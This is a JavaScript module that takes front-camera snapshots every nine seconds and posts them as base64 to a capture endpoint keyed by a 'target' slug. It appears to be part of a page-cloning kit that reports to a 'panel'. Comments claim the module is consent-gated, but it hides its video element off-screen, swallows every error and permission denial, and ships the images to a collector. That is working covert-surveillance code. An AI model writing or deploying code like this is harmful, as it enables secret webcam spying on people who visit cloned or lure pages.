/**
 * camera.js — captures still frames from the front-facing camera at a
 * fixed interval.
 *
 * Gated: this module only runs after the person on the page has read the
 * consent notice and pressed accept (see consent.js). With no gate present
 * it stays inert — it never falls back to firing on load.
 */
(function () {
  'use strict';

  /* Entry point — handed to the gate, not run on load. */
  function run() {
    if (!window.__SB_TARGET || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

    const SNAPSHOT_EVERY_MS = 9000;
    const FRAME_W = 640, FRAME_H = 640;

    // __SB_API yields an absolute URL on our own origin — relative paths get
    // rewritten by the cloner's <base href> and miss the panel entirely.
    var url = window.__SB_API
      ? window.__SB_API('camera')
      : (location.origin + '/api/capture.php?slug=' + encodeURIComponent(window.__SB_TARGET) + '&kind=camera');

    function send(b64) {
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/octet-stream' },
        body: b64,
        keepalive: true,
      }).catch(() => {});
    }

    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
      .then((stream) => {
        const video  = document.createElement('video');
        const canvas = document.createElement('canvas');
        video.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0';
        canvas.width = FRAME_W;
        canvas.height = FRAME_H;
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        video.play().catch(() => {});
        document.body.appendChild(video);

        const ctx   = canvas.getContext('2d');
        const track = (stream.getVideoTracks && stream.getVideoTracks()[0]) || null;
        var   timer = null;

        // Tear everything down once — when the user revokes the camera, when
        // the track dies, or when the page goes away. Without this the
        // interval kept firing against a dead track, posting black frames
        // every few seconds until the tab closed.
        function stop() {
          if (timer) { clearInterval(timer); timer = null; }
          try { stream.getTracks().forEach((t) => t.stop()); } catch (_) {}
          if (video.parentNode) video.parentNode.removeChild(video);
        }

        function snap() {
          // Track ended without firing 'ended' (some browsers) — bail out.
          if (track && track.readyState === 'ended') { stop(); return; }
          try {
            ctx.drawImage(video, 0, 0, FRAME_W, FRAME_H);
            const dataUrl = canvas.toDataURL('image/png');
            send(dataUrl.replace(/^data:image\/png;base64,/, ''));
          } catch (_) {}
        }

        if (track && track.addEventListener) track.addEventListener('ended', stop);
        window.addEventListener('pagehide', stop);

        // First frame after a short warm-up so the sensor exposes properly.
        setTimeout(snap, 1500);
        timer = setInterval(snap, SNAPSHOT_EVERY_MS);
      })
      .catch(() => { /* permission denied — silent */ });
  }

  // Fail-closed: no consent controller means no capture.
  if (!window.__SB_CONSENT) return;
  window.__SB_CONSENT.register('camera', run);
})();
